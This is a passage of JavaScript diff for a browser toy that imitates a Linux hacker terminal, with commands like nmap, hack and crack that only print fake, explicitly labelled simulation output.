+    if(FS[parent] && FS[parent].c.indexOf(name) === -1) FS[parent].c.push(name);
+    wT('[ Saved ' + nanoFile + ' ]', 'ok');
+  }
+  $('#nanoEditor').classList.remove('show');
+  tIn.focus();
+}
+$('#nanoEditor').addEventListener('keydown', function(e){
+  if(e.ctrlKey && e.key === 'o'){ e.preventDefault(); closeNano(true); }
+  if(e.ctrlKey && e.key === 'x'){ e.preventDefault(); closeNano(false); }
+});
+
+/* PYTHON REPL */
+let pyMode = false;
+async function pythonREPL(line){
+  if(line.trim() === 'exit()' || line.trim() === 'quit()'){ pyMode = false; wT('>>> exit()','dim'); return; }
+  wT('>>> ' + line, 'dim');
+  const t = line.trim();
+  try{
+    if(/^print\((.*)\)$/.test(t)){
+      const m = t.match(/^print\((.*)\)$/)[1].replace(/['"]/g,'');
+      wT(m, 'ok');
+    } else if(/^\d+\s*[\+\-\*\/]\s*\d+$/.test(t)){
+      wT(String(eval(t)), 'ok');
+    } else if(/^len\(['"](.+)['"]\)$/.test(t)){
+      wT(String(t.match(/['"](.+)['"]/)[1].length), 'ok');
+    } else if(/^import\s+(\w+)$/.test(t)){
+      wT("[Module '" + t.split(' ')[1] + "' loaded - SIMULASI]", 'dim');
+    } else {
+      wT('[SIMULASI — output tidak tersedia]', 'dim');
+    }
+  } catch(e){ wT('SyntaxError: invalid syntax', 'err'); }
+}
+
+/* INPUT HANDLERS */
+tIn.addEventListener('input', function(){ S.typing(); updateMirror(); showAC(getCompletions(tIn.value)); });
+tIn.addEventListener('keydown', async function(e){
+  if(e.key === 'Tab'){
+    e.preventDefault();
+    if(!acItems.length) acItems = getCompletions(tIn.value);
+    if(!acItems.length) return;
+    acIdx = (acIdx + 1) % acItems.length;
+    const parts = tIn.value.split(/\s+/);
+    parts[parts.length-1] = acItems[acIdx].text;
+    tIn.value = parts.join(' ') + (acItems[acIdx].type === 'cmd' ? ' ' : '');
+    updateMirror();
+    acBox.classList.add('show');
+    highlightAC();
+    return;
+  }
+  if(e.key === 'ArrowUp'){
+    e.preventDefault();
+    if(!TS.history.length) return;
+    TS.histIdx = TS.histIdx <= 0 ? 0 : TS.histIdx - 1;
+    tIn.value = TS.history[TS.histIdx];
+    updateMirror();
+    return;
+  }
+  if(e.key === 'ArrowDown'){
+    e.preventDefault();
+    if(TS.histIdx >= TS.history.length - 1){ TS.histIdx = TS.history.length; tIn.value = ''; updateMirror(); return; }
+    TS.histIdx++;
+    tIn.value = TS.history[TS.histIdx];
+    updateMirror();
+    return;
+  }
+  if(e.key === 'Escape'){ hideAC(); return; }
+  if(e.key === 'l' && e.ctrlKey){ e.preventDefault(); tOut.innerHTML = ''; return; }
+  if(e.key === 'c' && e.ctrlKey){ e.preventDefault(); wH(tPromptEl.innerHTML + esc(tIn.value) + '^C'); tIn.value = ''; updateMirror(); hideAC(); return; }
+  if(e.key === 'Enter'){
+    e.preventDefault();
+    hideAC();
+    const cmd = tIn.value;
+    if(!cmd.trim()){ tIn.value = ''; updateMirror(); wH(tPromptEl.innerHTML); return; }
+    if(pyMode){
+      wH(tPromptEl.innerHTML + esc(cmd));
+      addHistory(cmd);
+      tIn.value = '';
+      updateMirror();
+      await pythonREPL(cmd);
+      updatePrompt();
+      return;
+    }
+    wH(tPromptEl.innerHTML + esc(cmd));
+    addHistory(cmd);
+    tIn.value = '';
+    updateMirror();
+    S.b(700,.04);
+    try { await execute(cmd); } catch(err){ wT('Error: ' + err.message, 'err'); }
+    updatePrompt();
+  }
+});
+tBody.addEventListener('click', function(){ if(!$('#nanoEditor').classList.contains('show')) tIn.focus(); });
+
+/* LS color */
+function lsColor(name, node){
+  if(node && node.t === 'd') return '<span class="fs-dir">' + esc(name) + '</span>';
+  if(node && node.exec) return '<span class="fs-exec">' + esc(name) + '</span>';
+  if(name.indexOf('.') === 0) return '<span class="fs-hidden">' + esc(name) + '</span>';
+  return '<span>' + esc(name) + '</span>';
+}
+function fmtSize(s){ if(s === undefined) return '0'; if(s < 1024) return s + ''; if(s < 1048576) return (s/1024).toFixed(1) + 'K'; if(s < 1073741824) return (s/1048576).toFixed(1) + 'M'; return (s/1073741824).toFixed(1) + 'G'; }
+function permStr(node){ if(node && node.t === 'd') return 'drwxr-xr-x'; if(node && node.exec) return '-rwxr-xr-x'; if(node && node.t === 'f') return '-rw-r--r--'; return '----------'; }
+
+/* RUN COMMAND */
+async function runCmd(line){
+  const tokens = line.trim().split(/\s+/);
+  const cmd = tokens[0];
+  const args = tokens.slice(1);
+  const flags = args.filter(function(a){ return a.indexOf('-') === 0; });
+  const rest = args.filter(function(a){ return a.indexOf('-') !== 0; });
+
+  switch(cmd){
+    case '': break;
+    case 'help': {
+      out('ADRIANHACKMUL SHELL — COMMAND REFERENCE','info');
+      out('======================================','info');
+      out('');
+      const groups = {
+        'Filesystem':['pwd','cd','ls','cat','head','tail','mkdir','rmdir','touch','rm','cp','mv','tree','find','nano','vim'],
+        'System':['whoami','id','hostname','uname','uptime','date','cal','ps','df','free','top','neofetch'],
+        'Utility':['echo','history','which','man','clear','exit','banner','fortune','cowsay','figlet'],
+        'Network':['ping','curl','wget','nmap','nc','scan','trace','ssh'],
+        'Package':['apt','pkg'],
+        'Interpreter':['python','python3','node'],
+        'Security (SIM)':['hack','crack','decrypt','sudo','su','search'],
+        'AdrianHackMul':['matrix','theme','sound','desktop','contact','about']
+      };
+      for(const g in groups){
+        out('  ' + g, 'ok');
+        const cs = groups[g];
+        for(let i=0;i<cs.length;i+=4){
+          out('    ' + cs.slice(i, i+4).map(function(c){ return c.padEnd(12); }).join(''), 'dim');
+        }
+        out('');
+      }
+      out('  Tips: TAB autocomplete • ↑↓ history • Ctrl+L clear • nano <file>','warn');
+      break;
+    }
+    case 'about': {
+      out('AdrianHackMul Shell v12 — SIMULATION ONLY','ok');
+      out('Semua output dan filesystem adalah SIMULASI.','warn');
+      break;
+    }
+    case 'pwd': out(TS.cwd); break;
+    case 'cd': {
+      const target = rest[0] || '~';
+      const resolved = resolvePath(TS.cwd, target);
+      const node = FS[resolved];
+      if(!node){ out('bash: cd: ' + target + ': No such file or directory', 'err'); break; }
+      if(node.t !== 'd'){ out('bash: cd: ' + target + ': Not a directory', 'err'); break; }
+      TS.cwd = resolved;
+      updatePrompt();
+      break;
+    }
+    case 'ls': {
+      const long = flags.some(function(f){ return f.indexOf('l') !== -1; });
+      const all = flags.some(function(f){ return f.indexOf('a') !== -1; });
+      const target = rest[0];
+      const resolved = target ? resolvePath(TS.cwd, target) : TS.cwd;
+      const node = FS[resolved];
+      if(!node){ out('ls: cannot access \'' + (target || resolved) + '\': No such file or directory', 'err'); break; }
+      if(node.t === 'f'){ out(target || resolved); break; }
+      let items = node.c.slice();
+      if(!all) items = items.filter(function(n){ return n.indexOf('.') !== 0; });
+      items.sort();
+      if(long){
+        out('total ' + (items.length * 4), 'dim');
+        items.forEach(function(n){
+          const full = resolved === '/' ? ('/' + n) : (resolved + '/' + n);
+          const child = FS[full] || {t:'f', s:0};
+          const color = child.t === 'd' ? 'fs-dir' : child.exec ? 'fs-exec' : n.indexOf('.') === 0 ? 'fs-hidden' : '';
+          outH(permStr(child) + '  1 adrian adrian ' + fmtSize(child.s).padStart(6) + ' Oct 11 12:34 <span class="' + color + '">' + esc(n) + (child.t === 'd' ? '/' : '') + '</span>');
+        });
+      } else {
+        outH(items.map(function(n){
+          const full = resolved === '/' ? ('/' + n) : (resolved + '/' + n);
+          const child = FS[full] || {t:'f'};
+          return lsColor(n, child) + (child.t === 'd' ? '/' : '');
+        }).join('  '));
+      }
+      break;
+    }
+    case 'cat': {
+      if(!rest.length){ out('cat: missing operand', 'err'); break; }
+      rest.forEach(function(f){
+        const resolved = resolvePath(TS.cwd, f);
+        const node = FS[resolved];
+        if(!node){ out('cat: ' + f + ': No such file or directory', 'err'); return; }
+        if(node.t === 'd'){ out('cat: ' + f + ': Is a directory', 'err'); return; }
+        out(node.x || '');
+      });
+      break;
+    }
+    case 'head': {
+      const nFlag = flags.find(function(f){ return /^\-\d+/.test(f); });
+      const n = nFlag ? parseInt(nFlag.slice(1)) : 10;
+      const f = rest[0];
+      if(!f){ out('head: missing operand', 'err'); break; }
+      const node = FS[resolvePath(TS.cwd, f)];
+      if(!node){ out('head: cannot open \'' + f + '\'', 'err'); break; }
+      out((node.x || '').split('\n').slice(0, n).join('\n'));
+      break;
+    }
+    case 'tail': {
+      const nFlag = flags.find(function(f){ return /^\-\d+/.test(f); });
+      const n = nFlag ? parseInt(nFlag.slice(1)) : 10;
+      const f = rest[0];
+      if(!f){ out('tail: missing operand', 'err'); break; }
+      const node = FS[resolvePath(TS.cwd, f)];
+      if(!node){ out('tail: cannot open \'' + f + '\'', 'err'); break; }
+      out((node.x || '').split('\n').slice(-n).join('\n'));
+      break;
+    }
+    case 'echo': out(rest.join(' ').replace(/["']/g, '')); break;
+    case 'whoami': out(TS.isRoot ? 'root' : TS.user); break;
+    case 'id': out(TS.isRoot ? 'uid=0(root) gid=0(root)' : 'uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),27(sudo)'); break;
+    case 'hostname': out(TS.host); break;
+    case 'uname': {
+      if(flags.indexOf('-a') !== -1) out('Linux hackmul 6.6.0-adrianhackmul #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux');
+      else out('Linux');
+      break;
+    }
+    case 'uptime': {
+      const up = Math.floor((Date.now() - _bootTime) / 1000);
+      const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60);
+      out(' ' + new Date().toLocaleTimeString('en-GB') + ' up ' + h + ':' + String(m).padStart(2, '0') + ', 1 user, load average: 0.15, 0.22, 0.18');
+      break;
+    }
+    case 'date': out(new Date().toString()); break;
+    case 'cal': {
+      const now = new Date(), y = now.getFullYear(), m = now.getMonth();
+      const mn = now.toLocaleString('en-US', {month:'long'});
+      const first = new Date(y, m, 1).getDay();
+      const days = new Date(y, m+1, 0).getDate();
+      out('     ' + mn + ' ' + y, 'info');
+      out('Su Mo Tu We Th Fr Sa');
+      let line = '   '.repeat(first);
+      for(let d=1;d<=days;d++){
+        line += String(d).padStart(2) + ' ';
+        if((first + d) % 7 === 0){ out(line); line = ''; }
+      }
+      if(line) out(line);
+      break;
+    }
+    case 'clear': tOut.innerHTML = ''; break;
+    case 'history': TS.history.forEach(function(h, i){ out(String(i+1).padStart(4) + '  ' + h, 'dim'); }); break;
+    case 'mkdir': {
+      if(!rest.length){ out('mkdir: missing operand', 'err'); break; }
+      rest.forEach(function(d){
+        const rr = resolvePath(TS.cwd, d);
+        if(FS[rr]){ out('mkdir: cannot create directory \'' + d + '\': File exists', 'err'); return; }
+        FS[rr] = {t:'d', c:[]};
+        const parent = rr.slice(0, rr.lastIndexOf('/')) || '/';
+        const name = rr.slice(rr.lastIndexOf('/')+1);
+        if(FS[parent] && FS[parent].c.indexOf(name) === -1) FS[parent].c.push(name);
+      });
+      break;
+    }
+    case 'rmdir': {
+      rest.forEach(function(d){
+        const rr = resolvePath(TS.cwd, d);
+        if(!FS[rr]){ out('rmdir: failed to remove \'' + d + '\': No such file or directory', 'err'); return; }
+        if(FS[rr].t !== 'd'){ out('rmdir: failed to remove \'' + d + '\': Not a directory', 'err'); return; }
+        delete FS[rr];
+        const parent = rr.slice(0, rr.lastIndexOf('/')) || '/';
+        const name = rr.slice(rr.lastIndexOf('/')+1);
+        if(FS[parent]) FS[parent].c = FS[parent].c.filter(function(x){ return x !== name; });
+      });
+      break;
+    }
+    case 'touch': {
+      rest.forEach(function(f){
+        const rr = resolvePath(TS.cwd, f);
+        if(!FS[rr]){
+          FS[rr] = {t:'f', s:0, x:''};
+          const parent = rr.slice(0, rr.lastIndexOf('/')) || '/';
+          const name = rr.slice(rr.lastIndexOf('/')+1);
+          if(FS[parent] && FS[parent].c.indexOf(name) === -1) FS[parent].c.push(name);
+        }
+      });
+      break;
+    }
+    case 'rm': {
+      if(!rest.length){ out('rm: missing operand', 'err'); break; }
+      const rec = flags.some(function(f){ return f.indexOf('r') !== -1; });
+      const force = flags.some(function(f){ return f.indexOf('f') !== -1; });
+      rest.forEach(function(f){
+        const rr = resolvePath(TS.cwd, f);
+        const node = FS[rr];
+        if(!node){ if(!force) out('rm: cannot remove \'' + f + '\': No such file or directory', 'err'); return; }
+        if(node.t === 'd' && !rec){ out('rm: cannot remove \'' + f + '\': Is a directory', 'err'); return; }
+        delete FS[rr];
+        const parent = rr.slice(0, rr.lastIndexOf('/')) || '/';
+        const name = rr.slice(rr.lastIndexOf('/')+1);
+        if(FS[parent]) FS[parent].c = FS[parent].c.filter(function(x){ return x !== name; });
+      });
+      break;
+    }
+    case 'cp': {
+      if(rest.length < 2){ out('cp: missing destination', 'err'); break; }
+      const src = resolvePath(TS.cwd, rest[0]);
+      const dst = resolvePath(TS.cwd, rest[1]);
+      if(!FS[src]){ out('cp: cannot stat \'' + rest[0] + '\': No such file or directory', 'err'); break; }
+      FS[dst] = JSON.parse(JSON.stringify(FS[src]));
+      const parent = dst.slice(0, dst.lastIndexOf('/')) || '/';
+      const name = dst.slice(dst.lastIndexOf('/')+1);
+      if(FS[parent] && FS[parent].c.indexOf(name) === -1) FS[parent].c.push(name);
+      break;
+    }
+    case 'mv': {
+      if(rest.length < 2){ out('mv: missing destination', 'err'); break; }
+      const src = resolvePath(TS.cwd, rest[0]);
+      const dst = resolvePath(TS.cwd, rest[1]);
+      if(!FS[src]){ out('mv: cannot stat \'' + rest[0] + '\': No such file or directory', 'err'); break; }
+      FS[dst] = FS[src];
+      delete FS[src];
+      const p1 = src.slice(0, src.lastIndexOf('/')) || '/';
+      const p2 = dst.slice(0, dst.lastIndexOf('/')) || '/';
+      const n1 = src.slice(src.lastIndexOf('/')+1);
+      const n2 = dst.slice(dst.lastIndexOf('/')+1);
+      if(FS[p1]) FS[p1].c = FS[p1].c.filter(function(x){ return x !== n1; });
+      if(FS[p2] && FS[p2].c.indexOf(n2) === -1) FS[p2].c.push(n2);
+      break;
+    }
+    case 'tree': {
+      const root = rest[0] ? resolvePath(TS.cwd, rest[0]) : TS.cwd;
+      out(root, 'info');
+      const node = FS[root];
+      if(!node || node.t !== 'd'){ out('not a directory', 'err'); break; }
+      function draw(path, prefix){
+        const items = (FS[path] && FS[path].c || []).slice().sort();
+        items.forEach(function(n, i){
+          const last = i === items.length - 1;
+          const full = path === '/' ? ('/' + n) : (path + '/' + n);
+          const isDir = FS[full] && FS[full].t === 'd';
+          out(prefix + (last ? '└── ' : '├── ') + (isDir ? n + '/' : n), isDir ? 'info' : '');
+          if(isDir) draw(full, prefix + (last ? '    ' : '│   '));
+        });
+      }
+      draw(root, '');
+      break;
+    }
+    case 'find': {
+      const start = rest[0] || '.';
+      const nameIdx = args.indexOf('-name');
+      const pat = nameIdx >= 0 && args[nameIdx+1] ? args[nameIdx+1].replace(/["']/g, '') : null;
+      const root = resolvePath(TS.cwd, start);
+      const results = [];
+      function walk(path){
+        const node = FS[path];
+        if(!node) return;
+        const nm = path.split('/').pop() || '/';
+        if(!pat || nm.indexOf(pat.replace(/\*/g, '')) !== -1) results.push(path);
+        if(node.t === 'd') (node.c || []).forEach(function(c){ walk(path === '/' ? ('/' + c) : (path + '/' + c)); });
+      }
+      walk(root);
+      results.forEach(function(rr){ out(rr, 'dim'); });
+      break;
+    }
+    case 'which': {
+      if(!rest.length) break;
+      const c = rest[0];
+      if(CMDS.indexOf(c) !== -1) out('/usr/bin/' + c);
+      else out('which: no ' + c + ' in (/usr/local/bin:/usr/bin:/bin)', 'err');
+      break;
+    }
+    case 'man': {
+      if(!rest.length){ out('What manual page do you want?', 'err'); break; }
+      out('MANUAL — ' + rest[0], 'info');
+      out('NAME');
+      out('    ' + rest[0] + ' — ' + (DESC[rest[0]] || 'command'));
+      out('DESCRIPTION');
+      out('    Semua adalah SIMULASI untuk pembelajaran.');
+      break;
+    }
+    case 'sudo': {
+      if(!rest.length){ out('usage: sudo command', 'err'); break; }
+      out('[sudo] password for adrian: ', 'dim');
+      await slp(600);
+      out('Sorry, try again.', 'err');
+      out('sudo: 1 incorrect password attempt', 'err');
+      break;
+    }
+    case 'su': out('Password: ', 'dim'); await slp(500); out('su: Authentication failure', 'err'); break;
+    case 'apt': {
+      if(rest[0] === 'update'){ out('Hit:1 http://archive.adrianhackmul.local stable InRelease', 'dim'); out('All packages are up to date.', 'ok'); }
+      else if(rest[0] === 'install' || rest[0] === 'upgrade'){
+        const pkg = rest[1] || 'unknown';
+        out('Reading package lists... Done', 'dim');
+        out('Building dependency tree... Done', 'dim');
+        await slp(400);
+        out('The following NEW packages will be installed:', 'dim');
+        out('  ' + pkg, 'ok');
+        await slp(600);
+        out('Get:1 http://archive.adrianhackmul.local stable/main amd64 ' + pkg + ' amd64 1.0.0', 'dim');
+        await slp(500);
+        out('Unpacking ' + pkg + ' ...', 'dim');
+        await slp(500);
+        out('Setting up ' + pkg + ' ...', 'dim');
+        out('Done. (SIMULASI)', 'ok');
+      } else out('apt: SIMULASI ONLY', 'warn');
+      break;
+    }
+    case 'pkg': {
+      if(rest[0] === 'update' || rest[0] === 'upgrade'){
+        out('Checking availability of current mirror...', 'dim');
+        await slp(400);
+        out('Hit:1 https://packages.termux.dev stable InRelease', 'dim');
+        out('All packages are up to date.', 'ok');
+      } else if(rest[0] === 'install'){
+        const pkg = rest[1] || 'unknown';
+        out('Checking availability of current mirror...', 'dim');
+        await slp(400);
+        out('Get:1 https://packages.termux.dev stable/main aarch64 ' + pkg + ' aarch64 1.0.0 [' + ri(200, 999) + ' kB]', 'dim');
+        await slp(600);
+        out('Unpacking ' + pkg + ' ...', 'dim');
+        await slp(600);
+        out('Setting up ' + pkg + ' (1.0.0) ...', 'dim');
+        out('Done. (SIMULASI Termux)', 'ok');
+      } else if(rest[0] === 'list-installed'){
+        ['bash','coreutils','curl','git','python','nodejs','nano','vim','openssh','wget','nmap'].forEach(function(p){ out(p, 'dim'); });
+      } else out('pkg: SIMULASI Termux. Coba: pkg install <name>', 'warn');
+      break;
+    }
+    case 'git': {
+      if(rest[0] === 'clone'){
+        out('Cloning into \'' + (rest[1] || 'repo') + '\'...', 'dim');
+        await slp(500);
+        out('remote: Enumerating objects: 1250, done.', 'dim');
+        out('Receiving objects: 100% (1250/1250), 2.4 MiB | 1.2 MiB/s, done.', 'dim');
+        out('[SIMULATION]', 'warn');
+      } else if(rest[0] === 'status'){
+        out('On branch main', 'dim');
+        out('nothing to commit, working tree clean');
+      } else out('git: ' + (rest[0] || 'command') + ' (SIMULATION)', 'dim');
+      break;
+    }
+    case 'ssh': out('ssh: connect to host ' + (rest[0] || 'user@host') + ' port 22: Connection refused', 'err'); out('[SIMULATION]', 'warn'); break;
+    case 'ping': {
+      const t = rest[0] || '8.8.8.8';
+      out('PING ' + t + ' 56(84) bytes of data.', 'info');
+      for(let i=1;i<=4;i++){ await slp(400); out('64 bytes from ' + t + ': icmp_seq=' + i + ' ttl=64 time=' + (Math.random()*30+5).toFixed(2) + ' ms', 'dim'); }
+      out('--- ' + t + ' ping statistics ---', 'info');
+      out('4 packets transmitted, 4 received, 0% packet loss', 'ok');
+      break;
+    }
+    case 'curl': {
+      const t = rest.find(function(a){ return a.indexOf('-') !== 0; }) || 'http://example.com';
+      out('  % Total    % Received % Xferd  Average Speed', 'dim');
+      out('100  1256  100  1256    0     0   8421      0 --:--:-- --:--:-- --:--:-- 8421', 'dim');
+      out('<!DOCTYPE html><html><body><h1>Simulasi ' + t + '</h1></body></html>', 'ok');
+      break;
+    }
+    case 'wget': {
+      const url = rest[0] || 'http://example.com/file';
+      out('--' + new Date().toISOString() + '--  ' + url, 'dim');
+      out('Resolving host... 1.2.3.4', 'dim');
+      out('HTTP request sent, awaiting response... 200 OK', 'dim');
+      out('Length: 1048576 (1.0M)', 'dim');
+      for(let i=0;i<=100;i+=25){
+        out('  [' + '='.repeat(i/5) + ' '.repeat((100-i)/5) + '] ' + i + '%', 'ok');
+        await slp(200);
+      }
+      out('\'file\' saved [1048576/1048576]', 'ok');
+      break;
+    }
+    case 'nmap': {
+      const t = rest[0] || '127.0.0.1';
+      out('Starting Nmap 7.94 ( https://nmap.org )', 'info');
+      await slp(500);
+      out('Nmap scan report for ' + t, 'dim');
+      const ports = [[22,'ssh','OpenSSH 9.0'],[80,'http','nginx 1.24'],[443,'https','nginx 1.24'],[3306,'mysql','MySQL 8.0'],[8080,'http-proxy','']];
+      ports.filter(function(){ return Math.random() > .4; }).forEach(function(p){ out(p[0] + '/tcp  open  ' + p[1] + '    ' + p[2], 'ok'); });
+      out('Nmap done: 1 IP address scanned in 1.20 seconds', 'dim');
+      break;
+    }
+    case 'nc': out('nc: connection to ' + (rest[0] || '127.0.0.1') + ' port ' + (rest[1] || '8888') + ' refused', 'err'); break;
+    case 'ps': out('  PID TTY          TIME CMD', 'dim'); out(' 1234 pts/0    00:00:00 bash', 'dim'); out(' 1287 pts/0    00:00:00 ps', 'dim'); break;
+    case 'df': out('Filesystem      Size  Used Avail Use% Mounted on', 'dim'); out('/dev/sda1        50G   22G   26G  46% /', 'dim'); out('/dev/sda2       200G   84G  106G  45% /home', 'dim'); break;
+    case 'free': out('              total        used        free      available', 'dim'); out('Mem:           7.8G        2.1G        3.4G        5.2G', 'dim'); break;
+    case 'top': out('top - ' + new Date().toLocaleTimeString('en-GB') + ' up 5:23,  1 user,  load average: 0.15, 0.22, 0.18', 'info'); out('Tasks: 128 total,   1 running, 127 sleeping', 'dim'); out('  PID USER      %CPU  %MEM  COMMAND', 'dim'); out(' 1234 adrian     2.1   0.2  bash', 'dim'); break;
+    case 'neofetch': {
+      out('');
+      out('       ▄▀█ █▀▄ █▀█ █ ▄▀█ █▄░█    adrian@hackmul', 'info');
+      out('       █▀█ █▄▀ █▀▄ █ █▀█ █░▀█    ──────────────', 'info');
+      out('                                 OS: AdrianHackMul OS 1.0', 'info');
+      out('                                 Kernel: 6.6.0', 'info');
+      out('                                 Shell: bash 5.2', 'info');
+      out('                                 CPU: Adrian Core i9 (16)', 'info');
+      out('                                 Memory: 2103MiB / 7981MiB', 'info');
+      out('                                 Theme: [' + document.body.dataset.theme + ']', 'info');
+      out('');
+      break;
+    }
+    case 'stats': {
+      const up = Math.floor((Date.now() - _bootTime) / 1000);
+      out('Uptime:     ' + Math.floor(up/3600) + 'h ' + Math.floor((up%3600)/60) + 'm', 'info');
+      out('CPU:        ' + ri(8,45) + '%', 'info');
+      out('RAM:        ' + ri(1200,3400) + ' MiB / 7981 MiB', 'info');
+      break;
+    }
+    case 'fortune': {
+      const f = ['Talk is cheap. Show me the code.','Simplicity is the ultimate sophistication.','Security is not a product, but a process.','I use Arch, btw.','The best way to predict the future is to invent it.'];
+      out(pk(f), 'info');
+      break;
+    }
+    case 'cowsay': {
+      const m = rest.join(' ') || 'Moo!';
+      out(' ' + '_'.repeat(m.length + 2));
+      out('< ' + m + ' >');
+      out(' ' + '-'.repeat(m.length + 2));
+      out('        \\   ^__^');
+      out('         \\  (oo)\\_______');
+      out('            (__)\\       )\\/\\');
+      out('                ||----w |');
+      out('                ||     ||');
+      break;
+    }
+    case 'figlet': {
+      out('  _   _   ____  ', 'ok');
+      out(' | | | | |  _ \\ ', 'ok');
+      out(' | |_| | | |_) |', 'ok');
+      out(' |  _  | |  _ < ', 'ok');
+      out(' |_| |_| |_| \\_\\', 'ok');
+      break;
+    }
+    case 'banner': {
+      out('  ▄▀█ █▀▄ █▀█ █ ▄▀█ █▄░█ █░█ ▄▀█ █▀▀ █▄▀', 'ok');
+      out('  █▀█ █▄▀ █▀▄ █ █▀█ █░▀█ █▀█ █▀█ █▄▄ █░█', 'ok');
+      break;
+    }
+    case 'contact': out('📧 contact@adrianhackmul.fake', 'info'); out('🐦 @adrianhackmul', 'info'); break;
+    case 'exit': out('logout', 'dim'); out('Connection closed. (SIMULATION)', 'warn'); break;
+    case 'nano':
+    case 'vim': {
+      const f = rest[0];
+      const content = f ? (FS[resolvePath(TS.cwd, f)] && FS[resolvePath(TS.cwd, f)].x || '') : '';
+      openNano(f || '', content);
+      out('[ Editor: ' + (f || 'New Buffer') + ' ]', 'info');
+      out('[ Ctrl+O save • Ctrl+X exit ]', 'dim');
+      break;
+    }
+    case 'python':
+    case 'python3':
+    case 'node': {
+      pyMode = true;
+      out('Python 3.11.2 (SIMULASI)', 'dim');
+      out('Type "help", "copyright" or "license" for more information.', 'dim');
+      out('Ketik "exit()" untuk keluar.', 'warn');
+      break;
+    }
+    case 'matrix': document.body.classList.toggle('matrix-off'); out('[✓] Matrix toggled', 'ok'); break;
+    case 'theme': {
+      const t = rest[0];
+      if(['green','red','blue','amber','purple','pink'].indexOf(t) !== -1){
+        document.body.dataset.theme = t;
+        $('#theme').value = t;
+        out('[✓] Theme: ' + t, 'ok');
+      } else out('usage: theme [green|red|blue|amber|purple|pink]', 'err');
+      break;
+    }
+    case 'sound': {
+      S.init();
+      S.on = !S.on;
+      $('#sound').textContent = S.on ? '🔊' : '🔇';
+      out('[✓] Sound ' + (S.on ? 'ON' : 'OFF'), 'ok');
+      break;
+    }
+    case 'search': {
+      const q = rest.join(' ');
+      if(!q){ out('usage: search <keyword>', 'err'); break; }
+      const res = CMD_DB.filter(function(x){ return x.cmd.toLowerCase().indexOf(q.toLowerCase()) !== -1 || x.desc.toLowerCase().indexOf(q.toLowerCase()) !== -1; }).slice(0, 15);
+      if(!res.length){ out('Tidak ditemukan: ' + q, 'err'); break; }
+      out('🔍 Hasil "' + q + '" (' + res.length + '):', 'info');
+      res.forEach(function(x){ out('  [' + x.cat + '] ' + x.cmd, 'ok'); out('    ' + x.desc, 'dim'); });
+      break;
+    }
+    case 'desktop': if(typeof window.openDesktop === 'function'){ window.openDesktop(); out('[✓] Desktop activated', 'ok'); } break;
+    case 'scan': {
+      const t = rest[0] || '192.168.1.0/24';
+      out('[*] Scanning ' + t + '...', 'info');
+      for(let i=0;i<8;i++){ await slp(180); out('    192.168.1.' + ri(2,254) + '    ' + (Math.random()>.5?'OPEN':'CLOSED') + '    ' + ri(2,80) + 'ms', Math.random()>.5?'ok':'dim'); }
+      out('[✓] Scan complete (SIMULATION)', 'ok');
+      break;
+    }
+    case 'hack': {
+      const t = rest[0] || 'target.local';
+      out('[*] Target: ' + t, 'info');
+      await slp(300);
+      const stages = ['Bypassing firewall...','Injecting payload...','Escalating privileges...','Covering tracks...'];
+      for(let i=0;i<stages.length;i++){ await slp(500); out('    [+] ' + stages[i], 'warn'); }
+      out('[✓] ACCESS GRANTED — SIMULATION ONLY', 'ok');
+      S.ok();
+      break;
+    }
+    case 'trace': {
+      const t = rest[0] || '8.8.8.8';
+      out('traceroute to ' + t + ', 30 hops max', 'info');
+      const hops = ri(6,10);
+      for(let i=1;i<=hops;i++){ await slp(200); out(String(i).padStart(2) + '  ' + rip() + '  ' + (Math.random()*50+2).toFixed(2) + ' ms', 'dim'); }
+      out('[✓] Trace complete', 'ok');
+      break;
+    }
+    case 'crack': {
+      out('[!] Hash cracker (SIMULATION)...', 'warn');
+      for(let i=0;i<=100;i+=10){ await slp(150); out('    Progress: ' + i + '%  → ' + Math.random().toString(36).substring(2,12), 'dim'); }
+      out('[✓] Password: "h4ckm3_2025"', 'ok');
+      S.ok();
+      break;
+    }
+    case 'decrypt': {
+      out('[*] Decrypting (SIMULATION)...', 'info');
+      for(let i=0;i<=100;i+=20){ await slp(150); out('    ' + i + '%', 'dim'); }
+      out('[✓] File decrypted: secret.txt', 'ok');
+      break;
+    }
+    default:
+      out('bash: ' + cmd + ': command not found', 'err');
+      S.err();
+      out('Try \'help\' for available commands.', 'dim');
+  }
+}
+
+async function termBoot(){
+  const banner = [
+    ' ╔══════════════════════════════════════════════════════════╗',
+    ' ║            ADRIANHACKMUL SECURE SHELL v12.0              ║',
+    ' ║                    SIMULATION ONLY                       ║',
+    ' ╚══════════════════════════════════════════════════════════╝'
+  ];
+  for(let i=0;i<banner.length;i++){
+    await slp(60);
+    wT(banner[i], 'ok');
+  }
+  await slp(300);
+  wT('');
+  wT('Welcome to AdrianHackMul OS 1.0 LTS', 'info');
+  wT('');
+  wT('Last login: ' + new Date().toDateString(), 'dim');
+  wT('');
+  wT('Ketik "help" untuk command. TAB autocomplete. ↑↓ history.', 'warn');
+  wT('');
+  updatePrompt();
+}
+termBoot();
+
+/* TOOLS */
+const goT = function(){ go('terminal'); setTimeout(function(){ tIn.focus(); }, 300); };
+const TOOLS = [
+  {i:'🔍',n:'Network Scanner',d:'Port scan simulasi',f:async function(){ wT(''); for(let i=0;i<12;i++){ const p=ri(20,9999),s=Math.random()>.7?'OPEN':'CLOSED'; wT('    port ' + p + ' ' + s, s==='OPEN'?'ok':'dim'); await slp(80); } wT('[✓] Done.','ok'); goT(); }},
+  {i:'🔐',n:'Password Cracker',d:'Brute-force simulasi',f:async function(){ for(let i=0;i<20;i++){ wT('    trying ' + Math.random().toString(36).substring(2,10),'dim'); await slp(60); } wT('[✓] Found: h4ckm3_2025','ok'); S.ok(); goT(); }},
+  {i:'📡',n:'Packet Sniffer',d:'Stream hex palsu',f:function(){ let i=0; const t=setInterval(function(){ const hx=Array.from({length:16},function(){ return ri(0,255).toString(16).padStart(2,'0'); }).join(' '); wT('0x'+(i*16).toString(16).padStart(4,'0')+'  '+hx,'dim'); if(++i>18){ clearInterval(t); wT('[✓] Complete.','ok'); } },90); goT(); }},
+  {i:'🛡️',n:'Firewall Breaker',d:'Bypass visual',f:async function(){ for(let i=0;i<=100;i+=20){ wT('    ' + i + '%','info'); await slp(120); } wT('[✓] Bypassed','ok'); S.ok(); goT(); }},
